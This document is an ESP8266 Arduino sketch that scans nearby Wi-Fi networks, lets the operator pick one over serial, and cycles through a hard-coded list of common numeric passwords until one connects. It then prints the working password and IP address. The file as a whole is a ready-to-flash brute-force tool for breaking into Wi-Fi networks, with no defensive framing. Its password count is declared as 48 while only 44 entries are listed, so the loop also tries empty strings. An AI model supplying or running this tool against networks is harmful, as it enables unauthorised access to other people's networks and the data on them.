#include <ESP8266WiFi.h>

int networkCount = 0;
String ssidList[20];
bool waitingForInput = true;
int chosenIndex = -1;

const int maxPasswords = 48;
String passwordList[maxPasswords] = {
    "12345678", "123456789", "1234567890", "987654321", "10101010",
    "11223344", "12344321", "20202020", "19216811", "44556677",
    "00000000", "11111111", "22222222", "33333333", "44444444",
    "55555555", "66666666", "77777777", "88888888", "99999999",
    "11112222", "22223333", "33334444", "44445555", "55556666",
    "66667777", "77778888", "88889999", "12344321", "87654321",
    "22221111", "33332222", "44443333", "55554444", "66665555",
    "77776666", "88887777", "99998888", "44447777", "55558888",
    "66660000", "77770000", "88880000", "99990000"};

int blinkDelay = 500;      // Blink delay time for each attempt (in milliseconds)
int fastBlinkDelay = 100;  // Faster blink delay after successful connection
int connectionTimeout = 5; // Reduced timeout attempts (from 10 to 5)

void setup()
{
    Serial.begin(115200);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(1000);

    pinMode(LED_BUILTIN, OUTPUT); // Set the built-in LED as output

    Serial.println("Scanning for available Wi-Fi networks...");
    networkCount = WiFi.scanNetworks();

    if (networkCount == 0)
    {
        Serial.println("No networks found.");
    }
    else
    {
        Serial.println("Networks found:");
        for (int i = 0; i < networkCount && i < 20; i++)
        {
            ssidList[i] = WiFi.SSID(i);
            Serial.println(String(i) + ": " + ssidList[i] + " (" + WiFi.RSSI(i) + " dBm)" + (WiFi.encryptionType(i) == ENC_TYPE_NONE ? " [Open]" : ""));
        }
        Serial.println("\nEnter the index of the Wi-Fi network you want to try connecting to:");
    }
}

void loop()
{
    if (waitingForInput && Serial.available())
    {
        String input = Serial.readStringUntil('\n');
        input.trim();

        // Step 1: Choose network
        if (chosenIndex == -1)
        {
            chosenIndex = input.toInt();
            if (chosenIndex >= 0 && chosenIndex < networkCount)
            {
                Serial.println("Selected: " + ssidList[chosenIndex]);
                tryPasswords(ssidList[chosenIndex]);
                waitingForInput = false;
            }
            else
            {
                Serial.println("Invalid index. Please try again:");
                chosenIndex = -1;
            }
        }
    }
}

void tryPasswords(String ssid)
{
    Serial.println("\nTrying passwords...");

    for (int i = 0; i < maxPasswords; i++)
    {
        Serial.print("Trying password: ");
        Serial.println(passwordList[i]);

        WiFi.begin(ssid.c_str(), passwordList[i].c_str());

        int timeout = 0;
        while (WiFi.status() != WL_CONNECTED && timeout < connectionTimeout)
        {
            delay(300); // Reduced delay between attempts to speed up retries
            Serial.print(".");

            // Blink the built-in LED for each password attempt
            digitalWrite(LED_BUILTIN, HIGH); // Turn on the LED
            delay(blinkDelay);
            digitalWrite(LED_BUILTIN, LOW); // Turn off the LED
            delay(blinkDelay);

            timeout++;
        }

        if (WiFi.status() == WL_CONNECTED)
        {
            // If connected, blink the LED faster
            Serial.println("\n✅ Connected with password: " + passwordList[i]);
            Serial.println("IP Address: " + WiFi.localIP().toString());

            // Blink the LED faster once connected
            while (true)
            {
                digitalWrite(LED_BUILTIN, HIGH); // Turn on the LED
                delay(fastBlinkDelay);           // Faster blink delay
                digitalWrite(LED_BUILTIN, LOW);  // Turn off the LED
                delay(fastBlinkDelay);           // Faster blink delay
            }
        }
        else
        {
            Serial.println(" ❌ Failed");
            WiFi.disconnect();
            delay(1000);
        }
    }

    Serial.println("\n❌ Could not connect with any password in the list.");
}
